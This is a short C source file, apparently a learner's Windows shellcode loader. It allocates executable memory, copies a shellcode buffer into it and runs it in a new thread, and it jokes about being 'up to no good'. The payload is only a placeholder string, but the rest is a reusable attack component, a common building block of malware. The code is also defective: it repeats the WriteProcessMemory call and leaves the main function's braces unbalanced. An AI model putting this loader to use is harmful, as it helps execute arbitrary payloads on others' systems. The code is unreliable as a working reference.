/*
Project: A simple `CreateThread` injector
Take some shellcode, create a thread and inject it into your current process.

The API calls needed/used, are as follows (in this order):

VirtualAlloc
WriteProcessMemory
CreateThread
WaitForSingleObject
*/

//includes
#include <stdio.h>
#include <windows.h>

//macros for printf - this is totally new to me ...
#define  okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define  info(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define  warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)


// x64 shellcode here
static unsigned char sc[] = "shell_code_here";


// main func
int main() {
	printf("\n");
	info("I solemnly swear, I'm upto no good ;)\n");

	DWORD pi = GetCurrentProcessId();
	info("threadInjector PID: %ld\n", pi);

	LPVOID baseadd = VirtualAlloc(0, sizeof sc, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (baseadd == NULL) {
		warn("failed to allocate memory, error %ld", GetLastError());
	}
	else {
		okay("Allocated %zu bytes with PAGE_EXECUTE_READ Permissions\n", sizeof(sc));

	SIZE_T bytes;
	WriteProcessMemory(GetCurrentProcess(), baseadd, sc, sizeof sc, &bytes);
	if (WriteProcessMemory(GetCurrentProcess(), baseadd, sc, sizeof sc, &bytes)) {
		okay("Wrote %zu bytes to process memory\n", bytes);
	}
	else {
		warn("Failed to write to process memory, error %ld", GetLastError());
	}

	HANDLE th;
	th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)baseadd, NULL, 0, 0);
	if (th != NULL) {
		okay("Created thread with handle: %p\n", th);
	}
	else {
		warn("Failed to create thread, error %ld", GetLastError());
	}

	WaitForSingleObject(th, INFINITE);

	okay("Everything's in order ... Mischief managed! :>\n");
	return EXIT_SUCCESS;

}
